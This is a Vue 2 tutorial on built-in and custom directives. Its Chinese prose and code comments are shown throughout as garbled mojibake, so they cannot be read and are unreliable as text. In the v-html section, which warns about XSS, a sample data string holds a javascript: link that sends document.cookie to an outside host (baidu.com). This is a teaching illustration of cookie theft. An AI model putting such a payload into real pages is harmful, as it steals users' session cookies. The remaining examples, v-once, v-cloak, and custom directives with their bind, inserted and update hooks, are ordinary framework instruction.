# 07 ã€å†…ç½®æŒ‡ä»¤ è‡ªå®šä¹‰æŒ‡ä»¤ã€‘

## 1.å†…ç½®æŒ‡ä»¤

ä¹‹å‰å­¦è¿‡çš„æŒ‡ä»¤ï¼š 

- v-bind	  å•å‘ç»‘å®šè§£æè¡¨è¾¾å¼ï¼Œå¯ç®€å†™ä¸º**:**
- v-model	åŒå‘æ•°æ®ç»‘å®š
- v-for		   éå†æ•°ç»„ / å¯¹è±¡ / å­—ç¬¦ä¸²
- v-on		    ç»‘å®šäº‹ä»¶ç›‘å¬ï¼Œå¯ç®€å†™ä¸º**@**
- v-show	   æ¡ä»¶æ¸²æŸ“ (åŠ¨æ€æ§åˆ¶èŠ‚ç‚¹æ˜¯å¦å±•ç¤º)
- v-if		      æ¡ä»¶æ¸²æŸ“ï¼ˆåŠ¨æ€æ§åˆ¶èŠ‚ç‚¹æ˜¯å¦å­˜å­˜åœ¨ï¼‰
- v-else-if	  æ¡ä»¶æ¸²æŸ“ï¼ˆåŠ¨æ€æ§åˆ¶èŠ‚ç‚¹æ˜¯å¦å­˜å­˜åœ¨ï¼‰
- v-else	      æ¡ä»¶æ¸²æŸ“ï¼ˆåŠ¨æ€æ§åˆ¶èŠ‚ç‚¹æ˜¯å¦å­˜å­˜åœ¨ï¼‰

### 1.1v-text æŒ‡ä»¤

**v-textæŒ‡ä»¤ï¼š(ä½¿ç”¨çš„æ¯”è¾ƒå°‘)**

1.ä½œç”¨ï¼šå‘å…¶æ‰€åœ¨çš„èŠ‚ç‚¹ä¸­æ¸²æŸ“æ–‡æœ¬å†…å®¹ã€‚

2.ä¸æ’å€¼è¯­æ³•çš„åŒºåˆ«ï¼šv-textä¼šæ›¿æ¢æ‰èŠ‚ç‚¹ä¸­çš„å†…å®¹ï¼Œ{{xx}}åˆ™ä¸ä¼šã€‚

```html
<!-- å‡†å¤‡å¥½ä¸€ä¸ªå®¹å™¨-->
<div id="root">
    <div>ä½ å¥½ï¼Œ{{name}}</div>
    <div v-text="name"></div>
    <div v-text="str"></div>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //é˜»æ­¢ vue åœ¨å¯åŠ¨æ—¶ç”Ÿæˆç”Ÿäº§æç¤ºã€‚

    new Vue({
        el:'#root',
        data:{
            name:'å¼ ä¸‰',
            str:'<h3>ä½ å¥½å•Šï¼</h3>'
        }
    })
</script>
```

### 1.2 v-html æŒ‡ä»¤

**v-htmlæŒ‡ä»¤ï¼š**(ä½¿ç”¨çš„å¾ˆå°‘)

1.ä½œç”¨ï¼šå‘æŒ‡å®šèŠ‚ç‚¹ä¸­æ¸²æŸ“åŒ…å«htmlç»“æ„çš„å†…å®¹ã€‚

2.ä¸æ’å€¼è¯­æ³•çš„åŒºåˆ«ï¼š

* v-htmlä¼šæ›¿æ¢æ‰èŠ‚ç‚¹ä¸­æ‰€æœ‰çš„å†…å®¹ï¼Œ{{xx}}åˆ™ä¸ä¼šã€‚
* v-htmlå¯ä»¥è¯†åˆ«htmlç»“æ„ã€‚

3.ä¸¥é‡æ³¨æ„ï¼šv-htmlæœ‰å®‰å…¨æ€§é—®é¢˜ï¼ï¼ï¼ï¼

* åœ¨ç½‘ç«™ä¸ŠåŠ¨æ€æ¸²æŸ“ä»»æ„HTMLæ˜¯éå¸¸å±é™©çš„ï¼Œå®¹æ˜“å¯¼è‡´XSSæ”»å‡»ã€‚
* ä¸€å®šè¦åœ¨å¯ä¿¡çš„å†…å®¹ä¸Šä½¿ç”¨v-htmlï¼Œæ°¸ä¸è¦ç”¨åœ¨ç”¨æˆ·æäº¤çš„å†…å®¹ä¸Šï¼

```html
<!-- å‡†å¤‡å¥½ä¸€ä¸ªå®¹å™¨-->
<div id="root">
    <div>ä½ å¥½ï¼Œ{{name}}</div>
    <div v-html="str"></div>
    <div v-html="str2"></div>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //é˜»æ­¢ vue åœ¨å¯åŠ¨æ—¶ç”Ÿæˆç”Ÿäº§æç¤ºã€‚

    new Vue({
        el:'#root',
        data:{
            name:'å¼ ä¸‰',
            str:'<h3>ä½ å¥½å•Šï¼</h3>',
            str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>å…„å¼Ÿæˆ‘æ‰¾åˆ°ä½ æƒ³è¦çš„èµ„æºäº†ï¼Œå¿«æ¥ï¼</a>',
        }
    })
</script>
```

![image-20220629121130193](https://i0.hdslb.com/bfs/album/7c1c82f65d6431c7332ea00ece8fb6f3a2e8ef9e.png)

### 1.3v-cloak æŒ‡ä»¤

**v-cloakæŒ‡ä»¤ï¼ˆæ²¡æœ‰å€¼ï¼‰ï¼š**

* æœ¬è´¨æ˜¯ä¸€ä¸ªç‰¹æ®Šå±æ€§ï¼Œ`Vue`å®ä¾‹åˆ›å»ºå®Œæ¯•å¹¶æ¥ç®¡å®¹å™¨åï¼Œä¼šåˆ æ‰`v-cloak`å±æ€§ã€‚
* ä½¿ç”¨`css`é…åˆ`v-cloak`å¯ä»¥è§£å†³ç½‘é€Ÿæ…¢æ—¶é¡µé¢å±•ç¤ºå‡º{{xxx}}çš„é—®é¢˜ã€‚

```html
<style>
    [v-cloak]{
        display:none;
    }
</style>
<!-- å‡†å¤‡å¥½ä¸€ä¸ªå®¹å™¨-->
<div id="root">
    <h2 v-cloak>{{name}}</h2>
</div>
<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>

<script type="text/javascript">
    console.log(1)
    Vue.config.productionTip = false //é˜»æ­¢ vue åœ¨å¯åŠ¨æ—¶ç”Ÿæˆç”Ÿäº§æç¤ºã€‚

    new Vue({
        el:'#root',
        data:{
            name:'å°šç¡…è°·'
        }
    })
</script>
```

### 1.4v-once æŒ‡ä»¤

**v-onceæŒ‡ä»¤ï¼š**(ç”¨çš„å°‘)

* v-onceæ‰€åœ¨èŠ‚ç‚¹åœ¨åˆæ¬¡åŠ¨æ€æ¸²æŸ“åï¼Œå°±è§†ä¸ºé™æ€å†…å®¹äº†ã€‚
* ä»¥åæ•°æ®çš„æ”¹å˜ä¸ä¼šå¼•èµ·v-onceæ‰€åœ¨ç»“æ„çš„æ›´æ–°ï¼Œå¯ä»¥ç”¨äºä¼˜åŒ–æ€§èƒ½ã€‚

```html
<!-- å‡†å¤‡å¥½ä¸€ä¸ªå®¹å™¨-->
<div id="root">
    <h2 v-once>åˆå§‹åŒ–çš„nå€¼æ˜¯:{{ n }}</h2>
    <h2>å½“å‰çš„nå€¼æ˜¯:{{ n }}</h2>
    <button @click="n++">ç‚¹æˆ‘n+1</button>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //é˜»æ­¢ vue åœ¨å¯åŠ¨æ—¶ç”Ÿæˆç”Ÿäº§æç¤ºã€‚

    new Vue({
        el:'#root',
        data:{
            n:1
        }
    })
</script>
```

![image-20220629122504280](https://i0.hdslb.com/bfs/album/06cd80427b9d5601f4dee202bec841c4329dd8e4.png)

### 1.5v-pre æŒ‡ä»¤

**v-preæŒ‡ä»¤ï¼š**

* è·³è¿‡å…¶æ‰€åœ¨èŠ‚ç‚¹çš„ç¼–è¯‘è¿‡ç¨‹
* å¯åˆ©ç”¨å®ƒè·³è¿‡ï¼šæ²¡æœ‰ä½¿ç”¨æŒ‡ä»¤è¯­æ³•ã€æ²¡æœ‰ä½¿ç”¨æ’å€¼è¯­æ³•çš„èŠ‚ç‚¹ï¼Œä¼šåŠ å¿«ç¼–è¯‘

```html
<div id="root">
  <h2 v-pre>Vueå…¶å®å¾ˆç®€å•</h2>
  <h2 >å½“å‰çš„nå€¼æ˜¯:{{n}}</h2>
  <button @click="n++">ç‚¹æˆ‘n+1</button>
</div>

<script type="text/javascript">
  Vue.config.productionTip = false
  new Vue({ el:'#root', data:{n:1} })
</script>
```

> Djangoä¸­æ¨¡æ¿è¯­æ³•ä¹Ÿæ˜¯{{}}ï¼Œä½¿ç”¨è¿™ä¸ªæ˜¯é˜²æ­¢å†²çª

## 2.è‡ªå®šä¹‰æŒ‡ä»¤

**directives**

è®°ä½è¿™é‡Œé¢å°±æ˜¯æ“ä½œDomçš„

éœ€æ±‚1ï¼šå®šä¹‰ä¸€ä¸ª`v-big`æŒ‡ä»¤ï¼Œå’Œv-textåŠŸèƒ½ç±»ä¼¼ï¼Œä½†ä¼šæŠŠç»‘å®šçš„æ•°å€¼æ”¾å¤§10å€ã€‚

éœ€æ±‚2ï¼šå®šä¹‰ä¸€ä¸ª`v-fbind`æŒ‡ä»¤ï¼Œå’Œv-bindåŠŸèƒ½ç±»ä¼¼ï¼Œä½†å¯ä»¥è®©å…¶æ‰€ç»‘å®šçš„inputå…ƒç´ é»˜è®¤è·å–ç„¦ç‚¹ã€‚

**è¯­æ³•ï¼š**

å±€éƒ¨æŒ‡ä»¤ï¼š

```js
new Vue({															
  directives:{ 
    æŒ‡ä»¤å:é…ç½®å¯¹è±¡ 
  }   
})

new Vue({															
  directives:{ 
    æŒ‡ä»¤å:å›è°ƒå‡½æ•° 
  }   
})
```

å…¨å±€æŒ‡ä»¤ï¼š

```js
Vue.directive(æŒ‡ä»¤å, é…ç½®å¯¹è±¡)
æˆ–
Vue.directive(æŒ‡ä»¤å, å›è°ƒå‡½æ•°)


Vue.directive('fbind', {
    // æŒ‡ä»¤ä¸å…ƒç´ æˆåŠŸç»‘å®šæ—¶ï¼ˆä¸€ä¸Šæ¥ï¼‰
    bind(element, binding) {	// elementå°±æ˜¯DOMå…ƒç´ ï¼Œbindingå°±æ˜¯è¦ç»‘å®šçš„
      element.value = binding.value
    },
    // æŒ‡ä»¤æ‰€åœ¨å…ƒç´ è¢«æ’å…¥é¡µé¢æ—¶
    inserted(element, binding) {
      element.focus()
    },
    // æŒ‡ä»¤æ‰€åœ¨çš„æ¨¡æ¿è¢«é‡æ–°è§£ææ—¶ï¼ˆdataæ•°æ®æ”¹å˜å¯¼è‡´æ¨¡æ¿é‡æ–°è§£æï¼‰
    update(element, binding) {
      element.value = binding.value
    }
})
```

é…ç½®å¯¹è±¡ä¸­å¸¸ç”¨çš„3ä¸ªå›è°ƒï¼š

* **bindï¼šæŒ‡ä»¤ä¸å…ƒç´ æˆåŠŸç»‘å®šæ—¶è°ƒç”¨ã€‚**
* **insertedï¼šæŒ‡ä»¤æ‰€åœ¨å…ƒç´ è¢«æ’å…¥é¡µé¢æ—¶è°ƒç”¨ã€‚**
* **updateï¼šæŒ‡ä»¤æ‰€åœ¨æ¨¡æ¿ç»“æ„è¢«é‡æ–°è§£ææ—¶è°ƒç”¨ã€‚**

elementå°±æ˜¯DOMå…ƒç´ ï¼Œbindingå°±æ˜¯è¦ç»‘å®šçš„å¯¹è±¡ï¼Œå®ƒåŒ…å«ä»¥ä¸‹å±æ€§ï¼š`name`ã€`value`ã€`oldValue`ã€`expression`ã€`arg`ã€`modifiers`

> **å¤‡æ³¨**
>
> 1. æŒ‡ä»¤å®šä¹‰æ—¶ä¸åŠ `v-`ï¼Œä½†ä½¿ç”¨æ—¶è¦åŠ `v-`
> 2. æŒ‡ä»¤åå¦‚æœæ˜¯å¤šä¸ªå•è¯ï¼Œè¦ä½¿ç”¨`kebab-case`å‘½åæ–¹å¼ï¼Œä¸è¦ç”¨`camelCase`å‘½å 

```js
new Vue({
	el: '#root',
	data: {
		n:1
	},
	directives: {
		'big-number'(element,binding) {
			element.innerText = binding.value * 10
		}
	}
})
```

**å®šä¹‰å…¨å±€æŒ‡ä»¤**

```html
<!-- å‡†å¤‡å¥½ä¸€ä¸ªå®¹å™¨-->
<div id="root">
    <input type="text" v-fbind:value="n">
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    //å®šä¹‰å…¨å±€æŒ‡ä»¤
    Vue.directive('fbind', {
        // æŒ‡ä»¤ä¸å…ƒç´ æˆåŠŸç»‘å®šæ—¶ï¼ˆä¸€ä¸Šæ¥ï¼‰
        bind(element, binding){
            element.value = binding.value
        },
        // æŒ‡ä»¤æ‰€åœ¨å…ƒç´ è¢«æ’å…¥é¡µé¢æ—¶
        inserted(element, binding){
            element.focus()
        },
        // æŒ‡ä»¤æ‰€åœ¨çš„æ¨¡æ¿è¢«é‡æ–°è§£ææ—¶
        update(element, binding){
            element.value = binding.value
        }
    })
    
    new Vue({
        el:'#root',
        data:{
            name: 'å°šç¡…è°·',
            n: 1
        }
    })

</script>
```

**å±€éƒ¨æŒ‡ä»¤**

```html
<title>è‡ªå®šä¹‰æŒ‡ä»¤</title>
<script type="text/javascript" src="../js/vue.js"></script>

<div id="root">
  <h2>{{ name }}</h2>
  <h2>å½“å‰çš„nå€¼æ˜¯ï¼š<span v-text="n"></span> </h2>
  <!-- <h2>æ”¾å¤§10å€åçš„nå€¼æ˜¯ï¼š<span v-big-number="n"></span> </h2> -->
  <h2>æ”¾å¤§10å€åçš„nå€¼æ˜¯ï¼š<span v-big="n"></span> </h2>
  <button @click="n++">ç‚¹æˆ‘n+1</button>
  <hr />
  <input type="text" v-fbind:value="n">
</div>

<script type="text/javascript">
  Vue.config.productionTip = false

  // å®šä¹‰å…¨å±€æŒ‡ä»¤
  /* Vue.directive('fbind',{
		// æŒ‡ä»¤ä¸å…ƒç´ æˆåŠŸç»‘å®šæ—¶ï¼ˆä¸€ä¸Šæ¥ï¼‰
		bind(element,binding){
			element.value = binding.value
		},
		// æŒ‡ä»¤æ‰€åœ¨å…ƒç´ è¢«æ’å…¥é¡µé¢æ—¶
		inserted(element,binding){
			element.focus()
		},
		// æŒ‡ä»¤æ‰€åœ¨çš„æ¨¡æ¿è¢«é‡æ–°è§£ææ—¶
		update(element,binding){
			element.value = binding.value
		}
	}) */

  new Vue({
    el: '#root',
    data: {
      name: 'å°šç¡…è°·',
      n: 1
    },
    directives: {
      // bigå‡½æ•°ä½•æ—¶ä¼šè¢«è°ƒç”¨ï¼Ÿ
      // 1.æŒ‡ä»¤ä¸å…ƒç´ æˆåŠŸç»‘å®šæ—¶ï¼ˆä¸€ä¸Šæ¥ï¼‰ 2.æŒ‡ä»¤æ‰€åœ¨çš„æ¨¡æ¿è¢«é‡æ–°è§£ææ—¶
      /* 'big-number'(element,binding){
				// console.log('big')
				element.innerText = binding.value * 10
			}, */
      big(element, binding) {
        console.log('big', this) // ğŸ”´æ³¨æ„æ­¤å¤„çš„ this æ˜¯ window
        // console.log('big')
        element.innerText = binding.value * 10
      },
      fbind: {
        // æŒ‡ä»¤ä¸å…ƒç´ æˆåŠŸç»‘å®šæ—¶ï¼ˆä¸€ä¸Šæ¥ï¼‰
        bind(element, binding) {
          element.value = binding.value
        },
        // æŒ‡ä»¤æ‰€åœ¨å…ƒç´ è¢«æ’å…¥é¡µé¢æ—¶
        inserted(element, binding) {
          element.focus()
        },
        // æŒ‡ä»¤æ‰€åœ¨çš„æ¨¡æ¿è¢«é‡æ–°è§£ææ—¶
        update(element, binding) {
          element.value = binding.value
        }
      }
    }
  })
</script>
```

